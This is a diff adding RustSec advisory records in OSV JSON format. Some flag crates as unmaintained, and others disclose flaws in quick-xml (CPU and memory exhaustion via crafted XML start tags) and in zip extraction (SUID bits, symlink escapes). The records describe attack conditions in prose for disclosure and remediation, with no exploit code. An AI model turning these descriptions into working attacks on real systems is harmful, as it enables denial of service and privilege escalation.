+        "url": "https://github.com/dtolnay/paste"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "paste",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/paste"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affected_functions": null,
+          "affects": {
+            "arch": [],
+            "functions": [],
+            "os": []
+          }
+        },
+        "database_specific": {
+          "cvss": null,
+          "informational": "unmaintained",
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0436.json",
+          "categories": []
+        }
+      }
+    ],
+    "schema_version": "1.7.3"
+  },
+  "RUSTSEC-2026-0192": {
+    "id": "RUSTSEC-2026-0192",
+    "summary": "`ttf-parser` is unmaintained",
+    "details": "The author of `ttf-parser` has stated that the crate is unmaintained and will not receive further fixes (see the referenced issue).\n\n## Alternative(s)\n\n- [`skrifa`](https://crates.io/crates/skrifa), an actively maintained TrueType and OpenType font parsing crate, part of the Google Fonts \"oxidize\" (`fontations`) project.",
+    "modified": "2026-06-29T21:15:04.384453633Z",
+    "published": "2026-06-28T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/ttf-parser"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2026-0192.html"
+      },
+      {
+        "type": "REPORT",
+        "url": "https://github.com/harfbuzz/ttf-parser/issues/217"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "ttf-parser",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/ttf-parser"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affected_functions": null,
+          "affects": {
+            "os": [],
+            "functions": [],
+            "arch": []
+          }
+        },
+        "database_specific": {
+          "categories": [],
+          "cvss": null,
+          "informational": "unmaintained",
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0192.json"
+        }
+      }
+    ],
+    "schema_version": "1.7.5"
+  },
+  "RUSTSEC-2026-0194": {
+    "id": "RUSTSEC-2026-0194",
+    "summary": "Quadratic run time when checking a start tag for duplicate attribute names",
+    "details": "`BytesStart::attributes()` returns an `Attributes` iterator which, by default\n(`with_checks(true)`), rejects a start tag that repeats an attribute name. For\neach attribute yielded, the iterator compared the new name against every name\nseen so far in the same tag using a linear scan, so a start tag with `N`\ndistinct attribute names cost `O(N\u00b2)` byte comparisons. There was no bound on\n`N` other than the size of the buffered start tag.\n\n## Impact\n\nAny code that parses untrusted XML and iterates a start tag's attributes with\nthe default duplicate check enabled can be made to spend CPU time quadratic in\nthe number of attributes on a single tag. Because the check is pure computation\nwith no `.await`/I/O, an I/O-based timeout on the consumer (for example a read\nor request timeout) cannot interrupt it while it runs.\n\nMeasured cost of a single start tag, release build:\n\n| Attributes on one tag | Time |\n|---|---|\n| 80,000  | ~6 s   |\n| 800,000 | ~10 min |\n\nThe cost grows with the square of the attribute count, so a start tag of a few\ntens of megabytes can stall a parsing thread for hours. No memory is exhausted\nand the parser does not crash; the effect is CPU exhaustion on the thread doing\nthe parsing: a single crafted start tag can pin a CPU core for minutes to hours,\ndenying service to that worker. A deployment that places a wall-clock bound on\nparsing, or confines it to a non-critical thread, may consider the availability\nimpact lower.\n\n## Affected code paths\n\n* `BytesStart::attributes()` / `Attributes` iterated with checks enabled (the\n  default), and `BytesStart::try_get_attribute`.\n* `NsReader`, which resolves namespaces by iterating a tag's attributes and so\n  reaches the same check internally.\n\nConsumers that iterate attributes with `.attributes().with_checks(false)` and do\nnot use `NsReader` are not affected.\n\nThis was reported as reachable by a remote, unauthenticated attacker in a\nreal-world RPKI relying party (NLnet Labs Routinator) via a crafted RRDP\n`snapshot.xml`.\n\n## Remediation\n\nUpgrade to `quick-xml >= 0.41.0`, where the duplicate check keeps the linear\nscan for start tags with a small number of attributes and switches to an `O(1)`\nhash pre-filter above a threshold, making the whole tag `O(N)`. The reported\n`AttrError::Duplicated` positions are unchanged.\n\nIf upgrading is not possible and duplicate-name detection is not required,\ndisable it with `.attributes().with_checks(false)` (this does not help\n`NsReader` consumers, which have no equivalent opt-out before 0.41.0).",
+    "modified": "2026-07-02T08:00:03.849273679Z",
+    "published": "2026-06-29T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/quick-xml"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2026-0194.html"
+      },
+      {
+        "type": "REPORT",
+        "url": "https://github.com/tafia/quick-xml/issues/969"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/tafia/quick-xml/pull/971"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/tafia/quick-xml/commit/07f3db8343cf152f5bc3483ef5b3164582489bea"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "quick-xml",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/quick-xml"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              },
+              {
+                "fixed": "0.41.0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affects": {
+            "arch": [],
+            "os": [],
+            "functions": []
+          },
+          "affected_functions": null
+        },
+        "database_specific": {
+          "categories": [
+            "denial-of-service"
+          ],
+          "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "informational": null,
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0194.json"
+        }
+      }
+    ],
+    "schema_version": "1.7.5",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      }
+    ]
+  },
+  "RUSTSEC-2026-0195": {
+    "id": "RUSTSEC-2026-0195",
+    "summary": "Unbounded namespace-declaration allocation in `NsReader` enables memory-exhaustion denial of service",
+    "details": "`NsReader` resolves namespaces by calling `NamespaceResolver::push` for every\n`Start`/`Empty` event *before* the event is returned to the caller. `push`\niterated all `xmlns` / `xmlns:*` attributes on the start tag and, for each one,\nappended the prefix bytes to an internal buffer and pushed a `NamespaceBinding`\n(32 bytes on 64-bit) to an internal `Vec`, with no upper bound on the number of\ndeclarations.\n\n## Impact\n\nA start tag with `N` namespace declarations drove roughly `3\u00d7` the tag's byte\nsize in `NamespaceResolver` heap, allocated *inside* `quick-xml` before the\n`NsReader` consumer ever received the event and could inspect or reject it. A\nconsumer that bounds its *input* size therefore still cannot bound this\nallocation: an `M`-byte start tag yields on the order of `3 \u00d7 M` bytes of\nresolver heap the caller never sees.\n\nOn untrusted XML this lets a remote, unauthenticated attacker force large heap\nallocations with a single start tag. With several `NsReader`s running\nconcurrently on independent inputs (a common server pattern), the allocations\nstack and can exhaust process memory, causing the operating system to kill the\nprocess (OOM). This was confirmed against a real-world RPKI relying party (NLnet\nLabs Routinator), where concurrent RRDP validation workers parsing a crafted\n`snapshot.xml` exceeded the memory limit and the process was OOM-killed.\n\n## Affected code paths\n\nConsumers using `NsReader` (which always calls `NamespaceResolver::push` before\nyielding `Start`/`Empty`), or calling `NamespaceResolver::push` directly. A plain\n`Reader` that does not perform namespace resolution is not affected.\n\n## Remediation\n\nUpgrade to `quick-xml >= 0.41.0`. `NamespaceResolver::push` now rejects a start\ntag that declares more than `DEFAULT_MAX_DECLARATIONS_PER_ELEMENT` (256)\nnamespace bindings, returning the new `NamespaceError::TooManyDeclarations`\ninstead of allocating without limit. The limit is configurable via\n`NamespaceResolver::set_max_declarations_per_element` (use `usize::MAX` to\nrestore the previous unbounded behavior), and `NsReader::resolver_mut()` is\nprovided to reach it.\n\nThere is no clean workaround for `NsReader` consumers before 0.41.0, as the\nallocation happens inside the reader with no configuration knob to cap it.",
+    "modified": "2026-07-02T09:00:04.037478193Z",
+    "published": "2026-06-29T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/quick-xml"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2026-0195.html"
+      },
+      {
+        "type": "REPORT",
+        "url": "https://github.com/tafia/quick-xml/issues/970"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/tafia/quick-xml/commit/7ca25266e94987210daa864889ab15c9332c8a2a"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "quick-xml",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/quick-xml"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              },
+              {
+                "fixed": "0.41.0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affects": {
+            "os": [],
+            "functions": [],
+            "arch": []
+          },
+          "affected_functions": null
+        },
+        "database_specific": {
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0195.json",
+          "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "informational": null,
+          "categories": [
+            "denial-of-service"
+          ]
+        }
+      }
+    ],
+    "schema_version": "1.7.5",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      }
+    ]
+  },
+  "RUSTSEC-2026-0206": {
+    "id": "RUSTSEC-2026-0206",
+    "summary": "`rustybuzz` is unmaintained",
+    "details": "The current maintainer of `rustybuzz` has stated that the crate is unmaintained and will not receive further fixes or updates (see the referenced issue).\n\n## Alternative(s)\n\n- [`harfrust`](https://github.com/harfbuzz/harfrust), an actively maintained and updated alternative which is part of the Harfbuzz project.",
+    "modified": "2026-07-12T07:15:04.317501614Z",
+    "published": "2026-07-11T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/rustybuzz"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2026-0206.html"
+      },
+      {
+        "type": "REPORT",
+        "url": "https://github.com/harfbuzz/rustybuzz/issues/166"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "rustybuzz",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/rustybuzz"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affects": {
+            "arch": [],
+            "os": [],
+            "functions": []
+          },
+          "affected_functions": null
+        },
+        "database_specific": {
+          "cvss": null,
+          "informational": "unmaintained",
+          "categories": [],
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0206.json"
+        }
+      }
+    ],
+    "schema_version": "1.7.5"
+  },
+  "RUSTSEC-2026-0367": {
+    "id": "RUSTSEC-2026-0367",
+    "summary": " Insecure Preservation of SUID/SGID Bits during ZIP Extraction Leading to Potential Privilege Escalation",
+    "details": "The `zip` crate preserves privileged Unix permission bits (SUID, SGID, and sticky bits) from ZIP `external_attributes` during extraction, instead of masking them to safe permission bits. If a privileged process (for example, `root` in an installer, CI/CD pipeline, or container build) extracts an attacker-controlled ZIP archive using `ZipArchive::extract()` or the stream extraction API, files can be created as setuid-root or setgid. This behavior allows the creation of SUID/SGID files during extraction, which can lead to local privilege escalation depending on the execution environment.\n\nFor further details see: https://github.com/zip-rs/zip2/security/advisories/GHSA-vv5m-jxxh-4627",
+    "aliases": [
+      "GHSA-vv5m-jxxh-4627"
+    ],
+    "modified": "2026-10-16T23:30:02.392172556Z",
+    "published": "2026-10-09T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/zip"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2026-0367.html"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "zip",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/zip"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              },
+              {
+                "fixed": "9.0.0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affects": {
+            "functions": [],
+            "arch": [],
+            "os": []
+          },
+          "affected_functions": null
+        },
+        "database_specific": {
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0367.json",
+          "categories": [
+            "privilege-escalation"
+          ],
+          "cvss": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H",
+          "informational": null
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H"
+      }
+    ]
+  },
+  "RUSTSEC-2026-0368": {
+    "id": "RUSTSEC-2026-0368",
+    "summary": "zip: `ZipArchive::extract` creates symbolic links whose attacker-controlled targets are outside the destination directory",
+    "details": "In `zip` 9.0.0-pre2, `ZipArchive::extract` creates a symbolic link from an archive entry after validating only the output entry path. The link target bytes are passed directly to the platform symlink API, so a malicious archive can create an entry inside the destination that resolves to an attacker-chosen path outside it. This behavior was verified on macOS and Linux. On either platform, a subsequent application read or write through that extracted entry accesses the external target with the extracting process's permissions.\n\nFor further details see: https://github.com/zip-rs/zip2/security/advisories/GHSA-4v9h-p7m9-rh26",
+    "aliases": [
+      "GHSA-4v9h-p7m9-rh26"
+    ],
+    "modified": "2026-10-16T23:30:02.383750571Z",
+    "published": "2026-10-09T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/zip"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2026-0368.html"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "zip",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/zip"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              },
+              {
+                "fixed": "9.0.0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affects": {
+            "functions": [],
+            "arch": [],
+            "os": []
+          },
+          "affected_functions": null
+        },
+        "database_specific": {
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0368.json",
+          "categories": [
+            "privilege-escalation"
+          ],
+          "cvss": null,
+          "informational": null
+        }
+      }
+    ],
+    "schema_version": "1.9.0"
+  },
+  "RUSTSEC-2026-0369": {
+    "id": "RUSTSEC-2026-0369",
+    "summary": "ZipStreamReader::extract() and ZipArchive::extract() apply Unix permissions through symlinks without confining the target",
+    "details": "`ZipStreamReader::extract()` applies Unix permissions through extracted symlinks without validating the symlink target stays within the destination\n\nFor further details see: https://github.com/zip-rs/zip2/security/advisories/GHSA-4684-h2q9-2vcp",
+    "aliases": [
+      "GHSA-4684-h2q9-2vcp"
+    ],
+    "modified": "2026-10-16T23:30:02.387698467Z",
+    "published": "2026-10-10T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/zip"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2026-0369.html"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "zip",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/zip"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              },
+              {
+                "fixed": "9.0.0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affects": {
+            "os": [],
+            "functions": [],
+            "arch": []
+          },
+          "affected_functions": null
+        },
+        "database_specific": {
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0369.json",
+          "categories": [
+            "privilege-escalation"
+          ],
+          "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
+          "informational": null
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
+      }
+    ]
+  },
+  "RUSTSEC-2026-0370": {
+    "id": "RUSTSEC-2026-0370",
+    "summary": "`zvariant` is unmaintained",
+    "details": "The `zvariant` crate is no longer maintained as a standalone crate.\n\nIt has been merged into [`zbus`](https://crates.io/crates/zbus) starting with version `6.0.0`, as its `wire` module.\n\nUsers should migrate to [`zbus`](https://crates.io/crates/zbus), with its default features disabled if they only need the D-Bus wire format. Users of the GVariant format should migrate to [`zgvariant`](https://crates.io/crates/zgvariant).",
+    "modified": "2026-10-17T15:30:02.390032532Z",
+    "published": "2026-10-16T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/zvariant"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2026-0370.html"
+      },
+      {
+        "type": "REPORT",
+        "url": "https://github.com/z-galaxy/zbus/issues/2043"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "zvariant",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/zvariant"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affects": {
+            "arch": [],
+            "os": [],
+            "functions": []
+          },
+          "affected_functions": null
+        },
+        "database_specific": {
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0370.json",
+          "cvss": null,
+          "informational": "unmaintained",
+          "categories": []
+        }
+      }
+    ],
+    "schema_version": "1.9.0"
+  },
+  "RUSTSEC-2026-0371": {
+    "id": "RUSTSEC-2026-0371",
+    "summary": "`zbus_names` is unmaintained",
+    "details": "The `zbus_names` crate is no longer maintained as a standalone crate.\n\nIt has been merged into [`zbus`](https://crates.io/crates/zbus) starting with version `6.0.0`, as its `names` module.\n\nUsers should migrate to [`zbus`](https://crates.io/crates/zbus), with its default features disabled if they only need the D-Bus name types.",
+    "modified": "2026-10-17T15:30:02.407875527Z",
+    "published": "2026-10-16T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/zbus_names"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2026-0371.html"
+      },
+      {
+        "type": "REPORT",
+        "url": "https://github.com/z-galaxy/zbus/issues/2043"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "zbus_names",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/zbus_names"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affected_functions": null,
+          "affects": {
+            "functions": [],
+            "arch": [],
+            "os": []
+          }
+        },
+        "database_specific": {
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0371.json",
+          "categories": [],
+          "cvss": null,
+          "informational": "unmaintained"
+        }
+      }
+    ],
+    "schema_version": "1.9.0"
+  },
+  "RUSTSEC-2026-0372": {
+    "id": "RUSTSEC-2026-0372",
+    "summary": "`zvariant_derive` is unmaintained",
+    "details": "The `zvariant_derive` crate is no longer maintained as a standalone crate.\n\nIts derive macros are provided by [`zbus`](https://crates.io/crates/zbus) starting with version `6.0.0`.\n\nUsers should migrate to [`zbus`](https://crates.io/crates/zbus), with its default features disabled if they only need the D-Bus wire format.",
+    "modified": "2026-10-17T15:30:02.394812511Z",
+    "published": "2026-10-16T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/zvariant_derive"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2026-0372.html"
+      },
+      {
+        "type": "REPORT",
+        "url": "https://github.com/z-galaxy/zbus/issues/2043"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "zvariant_derive",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/zvariant_derive"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affected_functions": null,
+          "affects": {
+            "functions": [],
+            "arch": [],
+            "os": []
+          }
+        },
+        "database_specific": {
+          "informational": "unmaintained",
+          "categories": [],
+          "cvss": null,
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0372.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0"
+  }
+}
